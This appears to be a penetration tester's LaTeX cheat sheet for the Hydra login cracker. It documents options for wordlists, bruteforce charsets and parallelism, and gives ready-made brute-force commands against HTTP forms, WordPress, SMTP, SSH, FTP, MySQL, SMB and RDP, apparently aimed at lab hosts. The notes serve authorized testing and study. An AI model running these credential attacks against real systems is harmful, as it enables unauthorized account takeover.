\section{Hydra}
\label{tool:hydra}
Hydra â€“ a very fast network logon cracker which supports many different services. It is a parallelized login cracker which supports numerous protocols to attack


\section*{Common usages}

\section*{Options}
\subsection*{Login and password}

\begin{itemize}
    \item \verb+-l <LOGIN+>: Pass single username/login
    \item \verb+-L <FILE>+: Pass multiple usernames/logins
    \item \verb+-p <LOGIN>+: Pass single known password
    \item \verb+-P <FILE>+: Pass a password list or wordlist (ex.: rockyou.txt)
    \item \verb+C <FILE>+:   colon separated "login:pass" format, instead of -L/-P options
    \item \verb+-e nsr+: try "n" null password, "s" login as pass and/or "r" reversed login
    \item \verb+-u+: by default Hydra checks all passwords for one login and then tries the next login. This option loops around the passwords, so the first password is tried on all logins, then  the  next  password.
\end{itemize}


\begin{itemize}
    \item \verb+--x <MIN>:<MAX>:<CHARSET>+  password bruteforce generation, type "-x -h" to get help
        \begin{itemize}
            \item \verb+a+: lowercase letters
            \item \verb+A+: uppercase letters
            \item \verb+1+: numbers
            \item or all others,just add their real representation
        \end{itemize}
    \item \verb+-y+: disable the use of the above letters as placeholders. (a
        means 'a' cahracter...)
\end{itemize}

\subsection*{Host and port}

\verb+service://server[:PORT][/OPT]+

multiple host:
\verb+-M <FILE> <service>+   list of servers to attack, one entry per line, ':' to specify port
\verb+-f / -F+   exit when a login/pass pair is found (-M: -f per host, -F global)


\subsection*{Performance}

\begin{itemize}
    \item \verb+-t <TASKS>+:  run TASKS number of connects in parallel per target (default: 16)
    \item \verb+-T <TASKS>+:  run TASKS connects in parallel overall (for -M, default: 64)
    \item \verb+-w / -W TIME+:  wait time for a response (32) / between connects per thread (0)
    \item \verb+-c TIME+:   wait time per login attempt over all threads (enforces -t 1)
\end{itemize}

\subsection*{Verbose and debug}

\begin{itemize}
    \item \verb+-v+:
    \item \verb+-V+:
    \item \verb+-d+:
\end{itemize}

\subsection*{Output}
\begin{itemize}
    \item \verb+-o <FILE>+ write found login/password pairs to FILE instead of stdout
    \item \verb+-b <FORMAT>+ specify the format for the -o FILE: text(default), json, jsonv1
\end{itemize}

\subsection*{Proxy}

to use burpsuite proxy use \verb+connect://+
\begin{verbatim}
export HYDRA_PROXY=socks5://LOGIN:PASSWD@IP:PORT
\end{verbatim}

\subsection*{General}
\begin{itemize}
    \item \verb+-h+: help
    \item \verb+-R+: restore a previous aborted/crashed session
    \item \verb+-S+: perform an SSL connect
    \item \verb+-s <PORT>+: if the service is on a different default port, define it here
\end{itemize}

\section*{Protocols}
\begin{verbatim}
hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e

hydra -U <SERVICE>
\end{verbatim}

\subsection*{HTTP}
\subsubsection*{Basic Auth}

\begin{verbatim}
hydra -C <FILE> -f <IP> -s <PORT> http-get /<URL>
hydra -L /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt \
    -e nsr -s 80 -f 10.10.11.106 http-get /
\end{verbatim}

\subsubsection*{GET/POST Auth}
\begin{verbatim}
hydra -l <USER> -P <PASSWORDS> <IP_ADDRESS> -s <PORT>  http-post-form \
    "<url>:<form_param>:<condition string>[:<optional>[:<optional>]"
\end{verbatim}
\begin{itemize}
    \item form parameters: \verb+[u_param]=^(USER|USER64)^&[passwd_param]=^(PASS|PASS64)^+
    \item condition string: \verb+[F|S]=[success/failed string]+
    \item Optional:
        \begin{itemize}
            \item header: \verb+[h|H]=<header_name>\: <header_value>+
            \item skip pre-request: \verb+[g|G]+ (when no pre-cookies required)
            \item pre-cookie page: \verb+[c|C]=/page/uri+
        \end{itemize}
\end{itemize}

\begin{verbatim}
"/login.php:param_1=toto&username=^USER^&password=^PASS^:F=Invalid:H=User-Agent\:
Mozilla/5.0:H=Cookie\:..."
\end{verbatim}


\subsection*{POP3}

login = email adress

\subsection*{smtp}

\begin{verbatim}
hydra -v -l fiona@inlanefreight.htb -P /usr/share/wordlists/passwords/rockyou.txt smtp://10.129.203.7
\end{verbatim}



\subsection*{SSH}

\begin{verbatim}
hydra -L <FILE> -P <FILE> -u -f ssh://178.35.49.134:22 -t 4
\end{verbatim}

\subsection*{FTP}

\begin{verbatim}
hydra -L <FILE> -P <FILE> -u -f ftp://127.0.0.1
\end{verbatim}

\subsection*{MYSQL}

\begin{verbatim}
hydra -f -l user -P <FILE> $IP mysql
\end{verbatim}

\subsection*{SMB}

\begin{verbatim}
hydra -f -l user -P <FILE> $IP smb
\end{verbatim}

\subsection*{Wordpress}

\begin{verbatim}
hydra -f -l user -P <FILE> ${HYDRA_IP} -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
\end{verbatim}

\subsection*{RDP}

\begin{verbatim}
hydra -f -l administrator -P <FILE> rdp://${HYDRA_IP}
\end{verbatim}

\section*{links}
\url{https://www.hackingarticles.in/a-detailed-guide-on-hydra}
